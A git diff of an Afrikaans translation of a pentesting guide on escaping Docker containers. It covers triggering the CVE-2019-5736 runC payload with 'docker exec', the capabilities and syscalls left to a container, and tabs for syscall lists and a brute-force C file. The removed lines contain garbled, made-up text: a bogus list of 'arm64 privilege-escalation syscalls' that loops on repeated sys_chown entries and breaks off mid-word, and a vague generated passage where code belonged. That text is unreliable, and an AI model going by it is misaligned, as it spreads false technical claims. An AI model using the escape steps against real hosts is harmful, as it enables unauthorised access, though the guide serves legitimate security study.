+By uitvoering, sodra dit `[+] Oorskryf /bin/sh suksesvol` vertoon, moet jy die volgende vanaf die gasheer masjien uitvoer:
 
-`docker exec -it <houer-naam> /bin/sh`
+`docker exec -it <container-name> /bin/sh`
 
-Dit sal die lading aktiveer wat teenwoordig is in die main.go lêer.
+Dit sal die payload aktiveer wat in die main.go-lêer teenwoordig is.
 
 Vir meer inligting: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 {% hint style="info" %}
-Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
+Daar is ander CVEs waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
-## Docker Aangepaste Ontsnapping
+## Docker Pasgemaakte Ontsnapping
 
 ### Docker Ontsnappingsoppervlak
 
-* **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** via naamruimtes, sodat ons nie kan ontsnap om met ander prosesse te interaksieer as gevolg van naamruimtes (standaard kan nie kommunikeer via IPC's, Unix-sockets, netwerkdienste, D-Bus, `/proc` van ander prosesse nie).
-* **Root-gebruiker**: Standaard is die gebruiker wat die proses hardloop die root-gebruiker (tans is sy voorregte beperk).
-* **Vermoeëns**: Docker laat die volgende vermoëns oor: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscalls**: Dit is die syscalls wat die **root-gebruiker nie sal kan aanroep nie** (wegens 'n gebrek aan vermoëns + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.
+* **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** deur middel van naamruimtes, sodat ons nie kan ontsnap deur met ander procs te kommunikeer nie (per standaard kan nie kommunikeer via IPCs, unix sockets, netwerk svcs, D-Bus, `/proc` van ander procs).
+* **Root gebruiker**: Per standaard is die gebruiker wat die proses uitvoer die root gebruiker (maar sy voorregte is beperk).
+* **Vermogens**: Docker laat die volgende vermogens toe: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **Syscalls**: Dit is die syscalls wat die **root gebruiker nie kan aanroep nie** (as gevolg van ontbrekende vermogens + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.
 
 {% tabs %}
 {% tab title="x64 syscalls" %}
@@ -545,581 +546,7 @@ Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [
 ```
 {% endtab %}
 
-{% tab title="arm64 syscalls" %}  
-### arm64-syscalls
-
-Hierdie is 'n lys van arm64 syscalls wat gebruik kan word vir priviligie-escalasie in Docker.  
-Die volgende syscalls kan gebruik word vir priviligie-escalasie in Docker:
-
-- `sys_memfd_create`
-- `sys_bpf`
-- `sys_execveat`
-- `sys_userfaultfd`
-- `sys_membarrier`
-- `sys_mlock2`
-- `sys_copy_file_range`
-- `sys_pkey_mprotect`
-- `sys_pkey_alloc`
-- `sys_pkey_free`
-- `sys_statx`
-- `sys_rseq`
-- `sys_io_pgetevents`
-- `sys_pidfd_open`
-- `sys_clone3`
-- `sys_open_tree`
-- `sys_move_mount`
-- `sys_fsopen`
-- `sys_fsconfig`
-- `sys_fsmount`
-- `sys_fspick`
-- `sys_pidfd_getfd`
-- `sys_clone_file_range`
-- `sys_openat2`
-- `sys_pidfd_send_signal`
-- `sys_io_uring_setup`
-- `sys_io_uring_enter`
-- `sys_io_uring_register`
-- `sys_openat`
-- `sys_mkdirat`
-- `sys_mknodat`
-- `sys_faccessat`
-- `sys_fchmodat`
-- `sys_fchownat`
-- `sys_fexecve`
-- `sys_fstatat`
-- `sys_futimesat`
-- `sys_linkat`
-- `sys_mkdirat`
-- `sys_mknodat`
-- `sys_newfstatat`
-- `sys_openat`
-- `sys_readlinkat`
-- `sys_renameat`
-- `sys_symlinkat`
-- `sys_unlinkat`
-- `sys_utimensat`
-- `sys_bind`
-- `sys_connect`
-- `sys_listen`
-- `sys_accept4`
-- `sys_getsockname`
-- `sys_getpeername`
-- `sys_socket`
-- `sys_socketpair`
-- `sys_sendto`
-- `sys_sendmsg`
-- `sys_recvfrom`
-- `sys_recvmsg`
-- `sys_shutdown`
-- `sys_setsockopt`
-- `sys_getsockopt`
-- `sys_poll`
-- `sys_epoll_create`
-- `sys_epoll_create1`
-- `sys_epoll_ctl`
-- `sys_epoll_ctl_old`
-- `sys_epoll_pwait`
-- `sys_epoll_wait`
-- `sys_epoll_wait_old`
-- `sys_getdents64`
-- `sys_fcntl`
-- `sys_flock`
-- `sys_fsync`
-- `sys_fdatasync`
-- `sys_truncate`
-- `sys_ftruncate`
-- `sys_getcwd`
-- `sys_chdir`
-- `sys_fchdir`
-- `sys_rename`
-- `sys_renameat`
-- `sys_renameat2`
-- `sys_chmod`
-- `sys_fchmod`
-- `sys_fchmodat`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_access`
-- `sys_faccessat`
-- `sys_chdir`
-- `sys_fchdir`
-- `sys_chroot`
-- `sys_fchroot`
-- `sys_readlink`
-- `sys_readlinkat`
-- `sys_symlink`
-- `sys_symlinkat`
-- `sys_unlink`
-- `sys_unlinkat`
-- `sys_rmdir`
-- `sys_mkdir`
-- `sys_mkdirat`
-- `sys_mknod`
-- `sys_mknodat`
-- `sys_link`
-- `sys_linkat`
-- `sys_rename`
-- `sys_renameat`
-- `sys_renameat2`
-- `sys_chmod`
-- `sys_fchmod`
-- `sys_fchmodat`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_fchownat`
-- `sys_lchown`
-- `sys_lchown16`
-- `sys_chown`
-- `sys_fchown`
-- `sys_f
+{% tab title="arm64 syscalls" %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -1139,28 +566,7 @@ Die volgende syscalls kan gebruik word vir priviligie-escalasie in Docker:
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}  
-### Docker Breakout Privilege Escalation
-
-#### Overview
-
-Hierdie tegniek demonstreer hoe 'n aanvaller vanuit 'n Docker-houer kan ontsnap en bevoorregting kan verhoog deur die gebruik van 'n spesifieke kwesbaarheid in die Linux-kernel.
-
-#### Beskrywing
-
-Die aanvaller maak gebruik van 'n spesifieke kwesbaarheid in die Linux-kernel om toegang te verkry tot die host-stelsel vanuit 'n Docker-houer. Hierdie aanval vereis dat die aanvaller reeds toegang het tot 'n Docker-houer op die teikenstelsel.
-
-#### Aanvalstegniek
-
-1. Identifiseer die kwesbaarheid: Die aanvaller identifiseer 'n spesifieke kwesbaarheid in die Linux-kernel wat dit vir hom moontlik maak om vanuit 'n Docker-houer na die host-stelsel te ontsnap.
-2. Skryf 'n kwaadwillige kode: Die aanvaller skryf 'n kwaadwillige kode wat die kwesbaarheid uitbuit en hom toegang gee tot die host-stelsel.
-3. Voer die kode uit: Die aanvaller voer die kwaadwillige kode binne die Docker-houer uit om toegang te verkry tot die host-stelsel.
-4. Verhoog bevoorregting: Met toegang tot die host-stelsel kan die aanvaller sy bevoorregting verhoog en verdere aanvalle uitvoer.
-
-#### Voorkoming
-
-Om hierdie tipe aanval te voorkom, moet die Linux-kernel opgedateer word om die kwesbaarheid te verhelp wat deur die aanvaller uitgebuit word. Dit is ook belangrik om streng beperkings op te lê aan Docker-houers om die impak van 'n moontlike aanval te verminder.  
-{% endtab %}
+{% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
